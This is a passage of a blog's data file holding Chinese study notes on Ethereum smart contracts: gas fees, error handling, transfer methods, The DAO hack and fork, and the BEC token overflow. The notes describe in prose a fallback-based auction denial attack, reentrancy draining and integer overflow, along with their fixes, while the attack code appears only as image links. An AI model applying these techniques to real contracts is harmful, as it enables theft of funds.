class=\"headerlink\" title=\"创建与运行\"></a>创建与运行</h2><h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><ul>\n<li>写代码，进行编译为bytecode形式。</li>\n<li>创建合约：通过向0x00地址发起0ETH的转账交易。</li>\n<li>代码放在data域中，并且支付一定的gas fee.</li>\n</ul>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><ul>\n<li>智能合约运行在EVM上。</li>\n<li>EVM提供一个统一的运行平台。</li>\n<li>以太坊是一个交易驱动的状态机，要确定每个账户的状态。</li>\n<li>调用智能合约的交易发布到区块上，每个矿工都会执行这个交易。</li>\n<li>为了进行确定性的状态转移。</li>\n</ul>\n<h2 id=\"gas-fee\"><a href=\"#gas-fee\" class=\"headerlink\" title=\"gas fee\"></a>gas fee</h2><ul>\n<li>图灵完备系统。</li>\n<li>出现死循环是halting problem。</li>\n<li>执行合约收取gas fee，由发起人来支付。</li>\n<li>gas limit是最大限度的数据可用的gas 费用。</li>\n<li>先提取最大gas fee,多余大的再返回。</li>\n<li>少的话就就会回滚，退回到执行之前的状态。</li>\n<li>简单指令是便宜的，复杂的或者需要存储状态的指令很贵。</li>\n<li>读取公共数据是免费的。</li>\n<li>运行错误也会返回，运行的消耗的gas fee是不退回的，避免拒绝服务攻击。</li>\n</ul>\n<h3 id=\"扣费原理\"><a href=\"#扣费原理\" class=\"headerlink\" title=\"扣费原理\"></a>扣费原理</h3><ul>\n<li>状态数、交易树、收据树，都在本地维护。</li>\n<li>先在本地进行扣除最大gas 费用，不够不执行。</li>\n<li>执行完了加回多余的费用。</li>\n</ul>\n<h2 id=\"错误处理\"><a href=\"#错误处理\" class=\"headerlink\" title=\"错误处理\"></a>错误处理</h2><h3 id=\"不存在处理错误的操作。\"><a href=\"#不存在处理错误的操作。\" class=\"headerlink\" title=\"不存在处理错误的操作。\"></a>不存在处理错误的操作。</h3><h3 id=\"assert-bool-condition\"><a href=\"#assert-bool-condition\" class=\"headerlink\" title=\"assert(bool condition)\"></a>assert(bool condition)</h3><ul>\n<li>不满足条件就会抛出错误。</li>\n<li>用于内部的错误。</li>\n</ul>\n<h3 id=\"require-bool-condition\"><a href=\"#require-bool-condition\" class=\"headerlink\" title=\"require(bool condition)\"></a>require(bool condition)</h3><ul>\n<li>不满足条件就抛出错误。</li>\n<li>用于输入或者外部的组件引起的错误。</li>\n</ul>\n<h3 id=\"revert-throw\"><a href=\"#revert-throw\" class=\"headerlink\" title=\"revert(){throw()}\"></a>revert(){throw()}</h3><ul>\n<li>直接终止运行并进行回滚。</li>\n</ul>\n<h3 id=\"嵌套调用\"><a href=\"#嵌套调用\" class=\"headerlink\" title=\"嵌套调用\"></a>嵌套调用</h3><ul>\n<li>合约的执行具有原子性。</li>\n<li>一个合约调用另一个合约的函数。</li>\n<li>通过直接调用的方式会出现连锁回滚。</li>\n<li>通过address类型调用域代理调用不会混滚调用者的合约。</li>\n<li>转账默认调用fallback函数，也会进行嵌套调用。</li>\n</ul>\n<h2 id=\"区块发布\"><a href=\"#区块发布\" class=\"headerlink\" title=\"区块发布\"></a>区块发布</h2><h3 id=\"先执行再挖矿\"><a href=\"#先执行再挖矿\" class=\"headerlink\" title=\"先执行再挖矿\"></a>先执行再挖矿</h3><ul>\n<li>先获取三棵树的根哈希值。</li>\n</ul>\n<h3 id=\"消耗资源的节点获得什么补偿\"><a href=\"#消耗资源的节点获得什么补偿\" class=\"headerlink\" title=\"消耗资源的节点获得什么补偿\"></a>消耗资源的节点获得什么补偿</h3><ul>\n<li>没有补偿，还要验证交易的合法性与区块的同步性。</li>\n</ul>\n<h3 id=\"会不会不给汽油费不验证\"><a href=\"#会不会不给汽油费不验证\" class=\"headerlink\" title=\"会不会不给汽油费不验证\"></a>会不会不给汽油费不验证</h3><ul>\n<li>危害区块链安全，就相当于不干了。</li>\n<li>发新的区块时别人不认，相当于无效挖矿。</li>\n<li>可以抄别人的信息。</li>\n</ul>\n<h3 id=\"发布到区块链的交易是不是都是成功执行的\"><a href=\"#发布到区块链的交易是不是都是成功执行的\" class=\"headerlink\" title=\"发布到区块链的交易是不是都是成功执行的\"></a>发布到区块链的交易是不是都是成功执行的</h3><ul>\n<li>也要发布，需要扣汽油费。</li>\n<li>要不然无法扣汽油费。</li>\n</ul>\n<h4 id=\"收据树\"><a href=\"#收据树\" class=\"headerlink\" title=\"收据树\"></a>收据树</h4><p><img src=\"/../pic/Pasted%20image%2020240731184932.png\"></p>\n<h3 id=\"智能合约支不支持多核并行处理\"><a href=\"#智能合约支不支持多核并行处理\" class=\"headerlink\" title=\"智能合约支不支持多核并行处理\"></a>智能合约支不支持多核并行处理</h3><ul>\n<li>不支持多线程。</li>\n<li>状态转换是确定性的。</li>\n<li>多线程会导致结果不同。 </li>\n<li>产生随机数也不支持。</li>\n<li>使用的是伪随机数。</li>\n</ul>\n<h4 id=\"智能合约可以得到区块的信息\"><a href=\"#智能合约可以得到区块的信息\" class=\"headerlink\" title=\"智能合约可以得到区块的信息\"></a>智能合约可以得到区块的信息</h4><p><img src=\"/../pic/Pasted%20image%2020240731185943.png\"></p>\n<h4 id=\"智能合约可以获得调用的信息\"><a href=\"#智能合约可以获得调用的信息\" class=\"headerlink\" title=\"智能合约可以获得调用的信息\"></a>智能合约可以获得调用的信息</h4><p><img src=\"/../pic/Pasted%20image%2020240731190048.png\"></p>\n<ul>\n<li>message.data：发起的合约函数。</li>\n<li>tx.origin：交易或者调用的最终发起者。</li>\n</ul>\n<h3 id=\"地址类型\"><a href=\"#地址类型\" class=\"headerlink\" title=\"地址类型\"></a>地址类型</h3><p><img src=\"/../pic/Pasted%20image%2020240731190411.png\"></p>\n<ul>\n<li>address.transfer(amount)：转入函数。</li>\n<li>address.send：发送交易。</li>\n</ul>\n<h4 id=\"转账的三种方式\"><a href=\"#转账的三种方式\" class=\"headerlink\" title=\"转账的三种方式\"></a>转账的三种方式</h4><h5 id=\"transfer\"><a href=\"#transfer\" class=\"headerlink\" title=\"transfer\"></a>transfer</h5><ul>\n<li>专门转账的。</li>\n<li>失败就抛出异常，引起连锁回滚。</li>\n<li>汽油费少。</li>\n</ul>\n<h5 id=\"send\"><a href=\"#send\" class=\"headerlink\" title=\"send\"></a>send</h5><ul>\n<li>专门转账函数。</li>\n<li>失败返回false。</li>\n<li>汽油费少。</li>\n</ul>\n<h5 id=\"call-value\"><a href=\"#call-value\" class=\"headerlink\" title=\"call.value\"></a>call.value</h5><ul>\n<li>也不会引起失败连锁反应。</li>\n<li>把本来剩下的所有汽油费都发给执行节点。</li>\n</ul>\n<h2 id=\"拍卖合约\"><a href=\"#拍卖合约\" class=\"headerlink\" title=\"拍卖合约\"></a>拍卖合约</h2><h3 id=\"主合约\"><a href=\"#主合约\" class=\"headerlink\" title=\"主合约\"></a>主合约</h3><p><img src=\"/../pic/Pasted%20image%2020240731154908.png\"></p>\n<h3 id=\"竞拍合约函数\"><a href=\"#竞拍合约函数\" class=\"headerlink\" title=\"竞拍合约函数\"></a>竞拍合约函数</h3><p><img src=\"/../pic/Pasted%20image%2020240731191813.png\"></p>\n<h3 id=\"结束竞拍函数\"><a href=\"#结束竞拍函数\" class=\"headerlink\" title=\"结束竞拍函数\"></a>结束竞拍函数</h3><p><img src=\"/../pic/Pasted%20image%2020240731191946.png\"></p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><h4 id=\"攻击合约\"><a href=\"#攻击合约\" class=\"headerlink\" title=\"攻击合约\"></a>攻击合约</h4><p><img src=\"/../pic/Pasted%20image%2020240731193147.png\"></p>\n<h3 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h3><ul>\n<li>在黑客调用这个黑客合约函数时，会进行竞拍。</li>\n<li>把黑客发送的竞拍币都发给竞拍函数。</li>\n<li>在竞拍结束后，要返回非最高出价人的钱时。</li>\n<li>找不到黑客合约的fallback函数，转账失败。</li>\n<li>且用的是tranfer进行的转账回去，就会出现合约执行错误。</li>\n<li>所有人都无法获得发出的拍卖资金。</li>\n<li>无法补救。</li>\n<li>code is law.</li>\n</ul>\n<h3 id=\"修改合约函数\"><a href=\"#修改合约函数\" class=\"headerlink\" title=\"修改合约函数\"></a>修改合约函数</h3><h4 id=\"拍卖结束撤回资金\"><a href=\"#拍卖结束撤回资金\" class=\"headerlink\" title=\"拍卖结束撤回资金\"></a>拍卖结束撤回资金</h4><p><img src=\"/../pic/Pasted%20image%2020240731193958.png\"></p>\n<h4 id=\"给受益人转钱\"><a href=\"#给受益人转钱\" class=\"headerlink\" title=\"给受益人转钱\"></a>给受益人转钱</h4><p><img src=\"/../pic/Pasted%20image%2020240731194050.png\"></p>\n<h4 id=\"黑客合约\"><a href=\"#黑客合约\" class=\"headerlink\" title=\"黑客合约\"></a>黑客合约</h4><p><img src=\"/../pic/Pasted%20image%2020240731195121.png\"></p>\n<ul>\n<li>通过fallback一直进行递归调用转账.</li>\n<li>合约没钱了.</li>\n<li>汽油费不够了.</li>\n<li>调用栈超限.</li>\n</ul>\n"},{"title":"10-ETH-DAO","date":"2024-07-31T15:51:52.000Z","_content":"# DAO(Decenntralized Automous Orgarization)\n\n## The DAO（去中心化的自治组织的一个）\n\n### 介绍\n- 通过发送给众筹组织以太币，从而获取代币，从而获得投票权。\n- \n### 收回以太币（拆分）\n- 拆分成立子基金child DAO，然后投给自己。\n- 拆分之前有7天讨论期。\n- 拆分之后的子基金以太币28天冻结期。\n#### the dao 代码\n![](../pic/Pasted%20image%2020240731220617.png)\n- 应该先设置为0，在进行转账操作。\n\n#### 补救措施（失败）\n\n- 软件升级添加一个交易判断条件。\n- 跟the dao相关的都不合法的软分叉。\n- 但是没有问关于the dao的交易收取gas费用。\n\n#### 硬分叉的措施\n- 强行把the dao的资金转入新的合约。\n- 在第192w个区块进行强行转账。\n\n#### 不支持的分叉\n- 许多的以太币没有参与投票。\n- 多数即正义？\n- 新链叫ETC。\n- 增加了Chain ID区分新旧链。\n# DAC(De Au Corporation)\n\n- 盈利组织。\n- 没有法人地位。","source":"_posts/10-ETH-DAO.md","raw":"---\ntitle: 10-ETH-DAO\ndate: 2024-07-31 23:51:52\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n# DAO(Decenntralized Automous Orgarization)\n\n## The DAO（去中心化的自治组织的一个）\n\n### 介绍\n- 通过发送给众筹组织以太币，从而获取代币，从而获得投票权。\n- \n### 收回以太币（拆分）\n- 拆分成立子基金child DAO，然后投给自己。\n- 拆分之前有7天讨论期。\n- 拆分之后的子基金以太币28天冻结期。\n#### the dao 代码\n![](../pic/Pasted%20image%2020240731220617.png)\n- 应该先设置为0，在进行转账操作。\n\n#### 补救措施（失败）\n\n- 软件升级添加一个交易判断条件。\n- 跟the dao相关的都不合法的软分叉。\n- 但是没有问关于the dao的交易收取gas费用。\n\n#### 硬分叉的措施\n- 强行把the dao的资金转入新的合约。\n- 在第192w个区块进行强行转账。\n\n#### 不支持的分叉\n- 许多的以太币没有参与投票。\n- 多数即正义？\n- 新链叫ETC。\n- 增加了Chain ID区分新旧链。\n# DAC(De Au Corporation)\n\n- 盈利组织。\n- 没有法人地位。","slug":"10-ETH-DAO","published":1,"updated":"2024-07-31T15:54:19.864Z","comments":1,"layout":"post","photos":[],"_id":"clza14ode000384un14f7e73l","content":"<h1 id=\"DAO-Decenntralized-Automous-Orgarization\"><a href=\"#DAO-Decenntralized-Automous-Orgarization\" class=\"headerlink\" title=\"DAO(Decenntralized Automous Orgarization)\"></a>DAO(Decenntralized Automous Orgarization)</h1><h2 id=\"The-DAO（去中心化的自治组织的一个）\"><a href=\"#The-DAO（去中心化的自治组织的一个）\" class=\"headerlink\" title=\"The DAO（去中心化的自治组织的一个）\"></a>The DAO（去中心化的自治组织的一个）</h2><h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><ul>\n<li>通过发送给众筹组织以太币，从而获取代币，从而获得投票权。</li>\n<li></li>\n</ul>\n<h3 id=\"收回以太币（拆分）\"><a href=\"#收回以太币（拆分）\" class=\"headerlink\" title=\"收回以太币（拆分）\"></a>收回以太币（拆分）</h3><ul>\n<li>拆分成立子基金child DAO，然后投给自己。</li>\n<li>拆分之前有7天讨论期。</li>\n<li>拆分之后的子基金以太币28天冻结期。</li>\n</ul>\n<h4 id=\"the-dao-代码\"><a href=\"#the-dao-代码\" class=\"headerlink\" title=\"the dao 代码\"></a>the dao 代码</h4><p><img src=\"/../pic/Pasted%20image%2020240731220617.png\"></p>\n<ul>\n<li>应该先设置为0，在进行转账操作。</li>\n</ul>\n<h4 id=\"补救措施（失败）\"><a href=\"#补救措施（失败）\" class=\"headerlink\" title=\"补救措施（失败）\"></a>补救措施（失败）</h4><ul>\n<li>软件升级添加一个交易判断条件。</li>\n<li>跟the dao相关的都不合法的软分叉。</li>\n<li>但是没有问关于the dao的交易收取gas费用。</li>\n</ul>\n<h4 id=\"硬分叉的措施\"><a href=\"#硬分叉的措施\" class=\"headerlink\" title=\"硬分叉的措施\"></a>硬分叉的措施</h4><ul>\n<li>强行把the dao的资金转入新的合约。</li>\n<li>在第192w个区块进行强行转账。</li>\n</ul>\n<h4 id=\"不支持的分叉\"><a href=\"#不支持的分叉\" class=\"headerlink\" title=\"不支持的分叉\"></a>不支持的分叉</h4><ul>\n<li>许多的以太币没有参与投票。</li>\n<li>多数即正义？</li>\n<li>新链叫ETC。</li>\n<li>增加了Chain ID区分新旧链。</li>\n</ul>\n<h1 id=\"DAC-De-Au-Corporation\"><a href=\"#DAC-De-Au-Corporation\" class=\"headerlink\" title=\"DAC(De Au Corporation)\"></a>DAC(De Au Corporation)</h1><ul>\n<li>盈利组织。</li>\n<li>没有法人地位。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"DAO-Decenntralized-Automous-Orgarization\"><a href=\"#DAO-Decenntralized-Automous-Orgarization\" class=\"headerlink\" title=\"DAO(Decenntralized Automous Orgarization)\"></a>DAO(Decenntralized Automous Orgarization)</h1><h2 id=\"The-DAO（去中心化的自治组织的一个）\"><a href=\"#The-DAO（去中心化的自治组织的一个）\" class=\"headerlink\" title=\"The DAO（去中心化的自治组织的一个）\"></a>The DAO（去中心化的自治组织的一个）</h2><h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><ul>\n<li>通过发送给众筹组织以太币，从而获取代币，从而获得投票权。</li>\n<li></li>\n</ul>\n<h3 id=\"收回以太币（拆分）\"><a href=\"#收回以太币（拆分）\" class=\"headerlink\" title=\"收回以太币（拆分）\"></a>收回以太币（拆分）</h3><ul>\n<li>拆分成立子基金child DAO，然后投给自己。</li>\n<li>拆分之前有7天讨论期。</li>\n<li>拆分之后的子基金以太币28天冻结期。</li>\n</ul>\n<h4 id=\"the-dao-代码\"><a href=\"#the-dao-代码\" class=\"headerlink\" title=\"the dao 代码\"></a>the dao 代码</h4><p><img src=\"/../pic/Pasted%20image%2020240731220617.png\"></p>\n<ul>\n<li>应该先设置为0，在进行转账操作。</li>\n</ul>\n<h4 id=\"补救措施（失败）\"><a href=\"#补救措施（失败）\" class=\"headerlink\" title=\"补救措施（失败）\"></a>补救措施（失败）</h4><ul>\n<li>软件升级添加一个交易判断条件。</li>\n<li>跟the dao相关的都不合法的软分叉。</li>\n<li>但是没有问关于the dao的交易收取gas费用。</li>\n</ul>\n<h4 id=\"硬分叉的措施\"><a href=\"#硬分叉的措施\" class=\"headerlink\" title=\"硬分叉的措施\"></a>硬分叉的措施</h4><ul>\n<li>强行把the dao的资金转入新的合约。</li>\n<li>在第192w个区块进行强行转账。</li>\n</ul>\n<h4 id=\"不支持的分叉\"><a href=\"#不支持的分叉\" class=\"headerlink\" title=\"不支持的分叉\"></a>不支持的分叉</h4><ul>\n<li>许多的以太币没有参与投票。</li>\n<li>多数即正义？</li>\n<li>新链叫ETC。</li>\n<li>增加了Chain ID区分新旧链。</li>\n</ul>\n<h1 id=\"DAC-De-Au-Corporation\"><a href=\"#DAC-De-Au-Corporation\" class=\"headerlink\" title=\"DAC(De Au Corporation)\"></a>DAC(De Au Corporation)</h1><ul>\n<li>盈利组织。</li>\n<li>没有法人地位。</li>\n</ul>\n"},{"title":"11-ETH-反思","date":"2024-07-31T15:52:00.000Z","_content":"# 反思\n\n## 智能合约的反思\n\n### 特点\n- 自动合约。\n- 代码合同\n### 不可篡改性\n- 有漏洞无法进行补丁。\n- 冻结账户终结交易是困难的。\n- 只有软分叉才能实现冻结。\n- 快转走钱。\n\n### 什么是不可篡改的\n- 没有什么是不可篡改的。\n\n### 语言设计上的问题\n- 转账回调函数。\n- 图灵完备是不是好。\n- 模板化。\n- 合约专门的书写部门可能。\n\n### many eyeball fallacy\n- 别人看不懂源代码。\n\n### 去中心化\n-  对规则的修改需要进行投票。\n- 分叉是去中心化的体现，是民主的选择。\n\n### 去中心化 != 分布式\n\n- 去中心化是分布式。\n- 分布式可以是中心化。\n- 分布式是多个计算机处理一个任务。\n- 去中心化是为了容错，速度很慢。\n- 运行在上面的主要是某些控制逻辑。\n- 大规模的计算与存储是十分不划算的。","source":"_posts/11-ETH-反思.md","raw":"---\ntitle: 11-ETH-反思\ndate: 2024-07-31 23:52:00\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n# 反思\n\n## 智能合约的反思\n\n### 特点\n- 自动合约。\n- 代码合同\n### 不可篡改性\n- 有漏洞无法进行补丁。\n- 冻结账户终结交易是困难的。\n- 只有软分叉才能实现冻结。\n- 快转走钱。\n\n### 什么是不可篡改的\n- 没有什么是不可篡改的。\n\n### 语言设计上的问题\n- 转账回调函数。\n- 图灵完备是不是好。\n- 模板化。\n- 合约专门的书写部门可能。\n\n### many eyeball fallacy\n- 别人看不懂源代码。\n\n### 去中心化\n-  对规则的修改需要进行投票。\n- 分叉是去中心化的体现，是民主的选择。\n\n### 去中心化 != 分布式\n\n- 去中心化是分布式。\n- 分布式可以是中心化。\n- 分布式是多个计算机处理一个任务。\n- 去中心化是为了容错，速度很慢。\n- 运行在上面的主要是某些控制逻辑。\n- 大规模的计算与存储是十分不划算的。","slug":"11-ETH-反思","published":1,"updated":"2024-07-31T15:54:27.665Z","comments":1,"layout":"post","photos":[],"_id":"clza14odf000584un0vfndc9t","content":"<h1 id=\"反思\"><a href=\"#反思\" class=\"headerlink\" title=\"反思\"></a>反思</h1><h2 id=\"智能合约的反思\"><a href=\"#智能合约的反思\" class=\"headerlink\" title=\"智能合约的反思\"></a>智能合约的反思</h2><h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>自动合约。</li>\n<li>代码合同</li>\n</ul>\n<h3 id=\"不可篡改性\"><a href=\"#不可篡改性\" class=\"headerlink\" title=\"不可篡改性\"></a>不可篡改性</h3><ul>\n<li>有漏洞无法进行补丁。</li>\n<li>冻结账户终结交易是困难的。</li>\n<li>只有软分叉才能实现冻结。</li>\n<li>快转走钱。</li>\n</ul>\n<h3 id=\"什么是不可篡改的\"><a href=\"#什么是不可篡改的\" class=\"headerlink\" title=\"什么是不可篡改的\"></a>什么是不可篡改的</h3><ul>\n<li>没有什么是不可篡改的。</li>\n</ul>\n<h3 id=\"语言设计上的问题\"><a href=\"#语言设计上的问题\" class=\"headerlink\" title=\"语言设计上的问题\"></a>语言设计上的问题</h3><ul>\n<li>转账回调函数。</li>\n<li>图灵完备是不是好。</li>\n<li>模板化。</li>\n<li>合约专门的书写部门可能。</li>\n</ul>\n<h3 id=\"many-eyeball-fallacy\"><a href=\"#many-eyeball-fallacy\" class=\"headerlink\" title=\"many eyeball fallacy\"></a>many eyeball fallacy</h3><ul>\n<li>别人看不懂源代码。</li>\n</ul>\n<h3 id=\"去中心化\"><a href=\"#去中心化\" class=\"headerlink\" title=\"去中心化\"></a>去中心化</h3><ul>\n<li>对规则的修改需要进行投票。</li>\n<li>分叉是去中心化的体现，是民主的选择。</li>\n</ul>\n<h3 id=\"去中心化-分布式\"><a href=\"#去中心化-分布式\" class=\"headerlink\" title=\"去中心化 !&#x3D; 分布式\"></a>去中心化 !&#x3D; 分布式</h3><ul>\n<li>去中心化是分布式。</li>\n<li>分布式可以是中心化。</li>\n<li>分布式是多个计算机处理一个任务。</li>\n<li>去中心化是为了容错，速度很慢。</li>\n<li>运行在上面的主要是某些控制逻辑。</li>\n<li>大规模的计算与存储是十分不划算的。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"反思\"><a href=\"#反思\" class=\"headerlink\" title=\"反思\"></a>反思</h1><h2 id=\"智能合约的反思\"><a href=\"#智能合约的反思\" class=\"headerlink\" title=\"智能合约的反思\"></a>智能合约的反思</h2><h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>自动合约。</li>\n<li>代码合同</li>\n</ul>\n<h3 id=\"不可篡改性\"><a href=\"#不可篡改性\" class=\"headerlink\" title=\"不可篡改性\"></a>不可篡改性</h3><ul>\n<li>有漏洞无法进行补丁。</li>\n<li>冻结账户终结交易是困难的。</li>\n<li>只有软分叉才能实现冻结。</li>\n<li>快转走钱。</li>\n</ul>\n<h3 id=\"什么是不可篡改的\"><a href=\"#什么是不可篡改的\" class=\"headerlink\" title=\"什么是不可篡改的\"></a>什么是不可篡改的</h3><ul>\n<li>没有什么是不可篡改的。</li>\n</ul>\n<h3 id=\"语言设计上的问题\"><a href=\"#语言设计上的问题\" class=\"headerlink\" title=\"语言设计上的问题\"></a>语言设计上的问题</h3><ul>\n<li>转账回调函数。</li>\n<li>图灵完备是不是好。</li>\n<li>模板化。</li>\n<li>合约专门的书写部门可能。</li>\n</ul>\n<h3 id=\"many-eyeball-fallacy\"><a href=\"#many-eyeball-fallacy\" class=\"headerlink\" title=\"many eyeball fallacy\"></a>many eyeball fallacy</h3><ul>\n<li>别人看不懂源代码。</li>\n</ul>\n<h3 id=\"去中心化\"><a href=\"#去中心化\" class=\"headerlink\" title=\"去中心化\"></a>去中心化</h3><ul>\n<li>对规则的修改需要进行投票。</li>\n<li>分叉是去中心化的体现，是民主的选择。</li>\n</ul>\n<h3 id=\"去中心化-分布式\"><a href=\"#去中心化-分布式\" class=\"headerlink\" title=\"去中心化 !&#x3D; 分布式\"></a>去中心化 !&#x3D; 分布式</h3><ul>\n<li>去中心化是分布式。</li>\n<li>分布式可以是中心化。</li>\n<li>分布式是多个计算机处理一个任务。</li>\n<li>去中心化是为了容错，速度很慢。</li>\n<li>运行在上面的主要是某些控制逻辑。</li>\n<li>大规模的计算与存储是十分不划算的。</li>\n</ul>\n"},{"title":"13-ETH-区块链的应用","date":"2024-07-31T15:52:18.000Z","_content":"\n# 区块链不是万能的\n\n# 区块链在全链上上链信息\n\n# 没有信任关系\n\n# 去中心花与中心化模式是没有黑白分明的\n\n# 法律监管问题\n\n# 跨国交易与转账\n\n# 去中心化有自己的应用场景\n\n# 效率在当时的历史条件上看\n\n# 智能合约存在安全漏洞并且不易看懂\n- 程序化是大趋势。\n- 不能因噎废食。\n- 智能合约只能解决部分问题。\n\n\n\n\n\n","source":"_posts/13-ETH-区块链的应用.md","raw":"---\ntitle: 13-ETH-区块链的应用\ndate: 2024-07-31 23:52:18\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n\n# 区块链不是万能的\n\n# 区块链在全链上上链信息\n\n# 没有信任关系\n\n# 去中心花与中心化模式是没有黑白分明的\n\n# 法律监管问题\n\n# 跨国交易与转账\n\n# 去中心化有自己的应用场景\n\n# 效率在当时的历史条件上看\n\n# 智能合约存在安全漏洞并且不易看懂\n- 程序化是大趋势。\n- 不能因噎废食。\n- 智能合约只能解决部分问题。\n\n\n\n\n\n","slug":"13-ETH-区块链的应用","published":1,"updated":"2024-07-31T15:54:44.488Z","comments":1,"layout":"post","photos":[],"_id":"clza14odg000a84un3wvi3chw","content":"<h1 id=\"区块链不是万能的\"><a href=\"#区块链不是万能的\" class=\"headerlink\" title=\"区块链不是万能的\"></a>区块链不是万能的</h1><h1 id=\"区块链在全链上上链信息\"><a href=\"#区块链在全链上上链信息\" class=\"headerlink\" title=\"区块链在全链上上链信息\"></a>区块链在全链上上链信息</h1><h1 id=\"没有信任关系\"><a href=\"#没有信任关系\" class=\"headerlink\" title=\"没有信任关系\"></a>没有信任关系</h1><h1 id=\"去中心花与中心化模式是没有黑白分明的\"><a href=\"#去中心花与中心化模式是没有黑白分明的\" class=\"headerlink\" title=\"去中心花与中心化模式是没有黑白分明的\"></a>去中心花与中心化模式是没有黑白分明的</h1><h1 id=\"法律监管问题\"><a href=\"#法律监管问题\" class=\"headerlink\" title=\"法律监管问题\"></a>法律监管问题</h1><h1 id=\"跨国交易与转账\"><a href=\"#跨国交易与转账\" class=\"headerlink\" title=\"跨国交易与转账\"></a>跨国交易与转账</h1><h1 id=\"去中心化有自己的应用场景\"><a href=\"#去中心化有自己的应用场景\" class=\"headerlink\" title=\"去中心化有自己的应用场景\"></a>去中心化有自己的应用场景</h1><h1 id=\"效率在当时的历史条件上看\"><a href=\"#效率在当时的历史条件上看\" class=\"headerlink\" title=\"效率在当时的历史条件上看\"></a>效率在当时的历史条件上看</h1><h1 id=\"智能合约存在安全漏洞并且不易看懂\"><a href=\"#智能合约存在安全漏洞并且不易看懂\" class=\"headerlink\" title=\"智能合约存在安全漏洞并且不易看懂\"></a>智能合约存在安全漏洞并且不易看懂</h1><ul>\n<li>程序化是大趋势。</li>\n<li>不能因噎废食。</li>\n<li>智能合约只能解决部分问题。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"区块链不是万能的\"><a href=\"#区块链不是万能的\" class=\"headerlink\" title=\"区块链不是万能的\"></a>区块链不是万能的</h1><h1 id=\"区块链在全链上上链信息\"><a href=\"#区块链在全链上上链信息\" class=\"headerlink\" title=\"区块链在全链上上链信息\"></a>区块链在全链上上链信息</h1><h1 id=\"没有信任关系\"><a href=\"#没有信任关系\" class=\"headerlink\" title=\"没有信任关系\"></a>没有信任关系</h1><h1 id=\"去中心花与中心化模式是没有黑白分明的\"><a href=\"#去中心花与中心化模式是没有黑白分明的\" class=\"headerlink\" title=\"去中心花与中心化模式是没有黑白分明的\"></a>去中心花与中心化模式是没有黑白分明的</h1><h1 id=\"法律监管问题\"><a href=\"#法律监管问题\" class=\"headerlink\" title=\"法律监管问题\"></a>法律监管问题</h1><h1 id=\"跨国交易与转账\"><a href=\"#跨国交易与转账\" class=\"headerlink\" title=\"跨国交易与转账\"></a>跨国交易与转账</h1><h1 id=\"去中心化有自己的应用场景\"><a href=\"#去中心化有自己的应用场景\" class=\"headerlink\" title=\"去中心化有自己的应用场景\"></a>去中心化有自己的应用场景</h1><h1 id=\"效率在当时的历史条件上看\"><a href=\"#效率在当时的历史条件上看\" class=\"headerlink\" title=\"效率在当时的历史条件上看\"></a>效率在当时的历史条件上看</h1><h1 id=\"智能合约存在安全漏洞并且不易看懂\"><a href=\"#智能合约存在安全漏洞并且不易看懂\" class=\"headerlink\" title=\"智能合约存在安全漏洞并且不易看懂\"></a>智能合约存在安全漏洞并且不易看懂</h1><ul>\n<li>程序化是大趋势。</li>\n<li>不能因噎废食。</li>\n<li>智能合约只能解决部分问题。</li>\n</ul>\n"},{"title":"12-ETH-美链","date":"2024-07-31T15:52:09.000Z","_content":"# 美链(一种代币)\n- 只是一个智能合约。\n- 有自己的代币BEC.\n- ICO(Initial Coin offering)\n- 没有自己的链，代币的交易都是通过智能合约的函数来实现的。\n- 可以自定义规则，每个账户有多少代币存储在智能合约的状态变量里面。\n- ERC 20是以太坊的代币的一个标准，规范了所有发行的合约应该实现的功能和遵循的接口。（Ethereum Request for Comments）\n- 美链中有一个叫做batchTransfer的函数，功能是向多个接收者发送代币，把这些代币从调用者里面扣除。\n![](../pic/Pasted%20image%2020240731231353.png)\n\n- 数据乘法溢出。\n- 发送的很多。\n- 减少的很少。\n\n# 考虑是不是溢出\n\n# safemath库自动判断是否溢出\n","source":"_posts/12-ETH-美链.md","raw":"---\ntitle: 12-ETH-美链\ndate: 2024-07-31 23:52:09\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n# 美链(一种代币)\n- 只是一个智能合约。\n- 有自己的代币BEC.\n- ICO(Initial Coin offering)\n- 没有自己的链，代币的交易都是通过智能合约的函数来实现的。\n- 可以自定义规则，每个账户有多少代币存储在智能合约的状态变量里面。\n- ERC 20是以太坊的代币的一个标准，规范了所有发行的合约应该实现的功能和遵循的接口。（Ethereum Request for Comments）\n- 美链中有一个叫做batchTransfer的函数，功能是向多个接收者发送代币，把这些代币从调用者里面扣除。\n![](../pic/Pasted%20image%2020240731231353.png)\n\n- 数据乘法溢出。\n- 发送的很多。\n- 减少的很少。\n\n# 考虑是不是溢出\n\n# safemath库自动判断是否溢出\n","slug":"12-ETH-美链","published":1,"updated":"2024-07-31T15:54:38.346Z","comments":1,"layout":"post","photos":[],"_id":"clza14odh000d84un050wh05s","content":"<h1 id=\"美链-一种代币\"><a href=\"#美链-一种代币\" class=\"headerlink\" title=\"美链(一种代币)\"></a>美链(一种代币)</h1><ul>\n<li><p>只是一个智能合约。</p>\n</li>\n<li><p>有自己的代币BEC.</p>\n</li>\n<li><p>ICO(Initial Coin offering)</p>\n</li>\n<li><p>没有自己的链，代币的交易都是通过智能合约的函数来实现的。</p>\n</li>\n<li><p>可以自定义规则，每个账户有多少代币存储在智能合约的状态变量里面。</p>\n</li>\n<li><p>ERC 